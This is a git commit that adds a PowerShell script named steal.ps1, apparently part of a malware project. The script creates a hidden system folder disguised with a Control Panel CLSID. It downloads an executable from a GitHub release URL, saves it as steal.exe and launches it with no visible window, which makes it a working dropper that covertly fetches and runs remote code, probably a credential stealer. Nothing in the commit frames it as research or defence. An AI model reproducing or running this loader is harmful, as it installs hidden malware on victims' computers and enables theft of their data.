c00d6a1c8d8ceeb1242743b7ee54a85d28e4b234
43a1723 <hai1723notgay@gmail.com>
2024-08-30 08:45:10 +0700

    Create steal.ps1

---
+++ scr/steal.ps1
@@ -0,0 +1,14 @@
+$rdir = "$env:localappdata\Loader"
+$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+New-Item -ItemType Directory -Path $dir
+attrib +h +s $dir
+
+$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/tootls.exe"
+$output = "$dir\steal.exe"
+
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process -WindowStyle Hidden -FilePath $output
+}
